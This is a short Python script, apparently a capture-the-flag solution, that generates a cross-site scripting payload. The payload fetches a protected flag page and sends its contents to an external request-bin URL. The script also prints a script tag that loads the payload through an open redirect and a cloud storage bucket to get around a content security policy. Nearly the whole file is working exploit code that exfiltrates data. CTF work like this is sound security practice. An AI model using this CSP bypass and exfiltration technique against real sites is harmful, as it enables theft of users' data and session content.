import sys
import base64

if len(sys.argv) != 4:
    print "Please specify challenge URL, Request bin URL and GCS bucket"
    print "python solution.py http://challenge.host.com http://endiel6lj35l8.x.pipedream.net http://storage.googleapis.com/bucketname"
else:  
	vector = "var xhr = new XMLHttpRequest();\n xhr.open('GET','" + sys.argv[1] + '/csp-three-flag'
	vector = vector + "', true);\n xhr.onload = function () { var request = new XMLHttpRequest();\n request.open('GET', '"
	vector = vector + sys.argv[2] + "?flag='+xhr.responseText, true);\n request.send()};\n xhr.send(null);"
	f = open("payload.js", "w")
	f.write(vector)
	f.close()
	print vector 
	print "Written to payload.js"
	print '<script src="' + sys.argv[1] + '/redirect?url=' + sys.argv[3] + '/payload.js"></script>'